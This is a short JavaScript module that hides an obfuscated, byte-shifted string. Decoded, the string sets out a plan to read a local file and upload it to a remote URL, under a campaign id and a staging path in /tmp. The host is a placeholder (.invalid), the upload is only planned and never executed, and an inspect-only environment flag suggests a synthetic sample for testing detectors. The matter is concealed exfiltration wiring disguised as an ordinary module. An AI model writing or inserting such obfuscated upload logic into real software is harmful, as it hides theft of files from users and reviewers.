  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_ede00ebe = "\\x7e\\x45\\x39\\x84\\x7b\\x7c\\x6d\\x78\\x7b\\x45\\x7a\\x6d\\x69\\x6c\\x67\\x6e\\x71\\x74\\x6d\\x34\\x7c\\x7a\\x69\\x76\\x7b\\x75\\x71\\x7c\\x67\\x7a\\x6d\\x75\\x77\\x7c\\x6d\\x84\\x69\\x6c\\x69\\x78\\x7c\\x6d\\x7a\\x45\\x7b\\x7c\\x7a\\x6d\\x69\\x75\\x67\\x78\\x71\\x78\\x6d\\x74\\x71\\x76\\x6d\\x84\\x7b\\x7c\\x69\\x6f\\x6d\\x67\\x6b\\x77\\x7d\\x76\\x7c\\x45\\x39\\x84\\x6b\\x69\\x75\\x78\\x69\\x71\\x6f\\x76\\x67\\x71\\x6c\\x45\\x56\\x57\\x4c\\x4d\\x35\\x4c\\x40\\x40\\x4e\\x49\\x41\\x4a\\x3a\\x84\\x7d\\x7a\\x74\\x45\\x70\\x7c\\x7c\\x78\\x7b\\x42\\x37\\x37\\x76\\x77\\x6c\\x6d\\x35\\x6c\\x40\\x40\\x6e\\x69\\x41\\x6a\\x3a\\x40\\x6e\\x6e\\x6b\\x36\\x6d\\x80\\x69\\x75\\x78\\x74\\x6d\\x36\\x71\\x76\\x7e\\x69\\x74\\x71\\x6c\\x37\\x69\\x78\\x71\\x84\\x7d\\x7b\\x6d\\x7a\\x67\\x69\\x6f\\x6d\\x76\\x7c\\x45\\x56\\x77\\x6c\\x6d\\x49\\x7d\\x6c\\x71\\x7c\\x37\\x6c\\x40\\x40\\x6e\\x84\\x6e\\x71\\x74\\x6d\\x67\\x78\\x69\\x7c\\x70\\x45\\x37\\x7c\\x75\\x78\\x37\\x70\\x7d\\x76\\x7c\\x7a\\x6d\\x7b\\x7b\\x35\\x76\\x77\\x6c\\x6d\\x37\\x36\\x7b\\x7c\\x69\\x6f\\x6d\\x35\\x6c\\x40\\x40\\x6e\\x69\\x41\\x6a\\x3a\\x40\\x6e\\x6e\\x6b\\x36\\x75\\x72\\x7b";
  const Codec_ede00ebe = "escaped_octets|add_modulo_256|08";

  function load_ede00ebe() { return [...Material_ede00ebe.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_ede00ebe(storedBytes) { return storedBytes.map((value) => (value - 8 + 256) & 255); }
  async function recover_ede00ebe() {
    const harmlessValue = 19 * 7 - 133;
    const storedBytes = load_ede00ebe(); let recoveredBytes = [];
    switch (1) { case 1: recoveredBytes = decode_ede00ebe(storedBytes); break; default: throw new Error("state"); }
    void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
  }
  async function inspect_ede00ebe() { return JSON.parse(JSON.stringify({ value: await recover_ede00ebe() })).value; }
  async function plan_ede00ebe() { const inspect = inspect_ede00ebe; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_ede00ebe;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_ede00ebe());
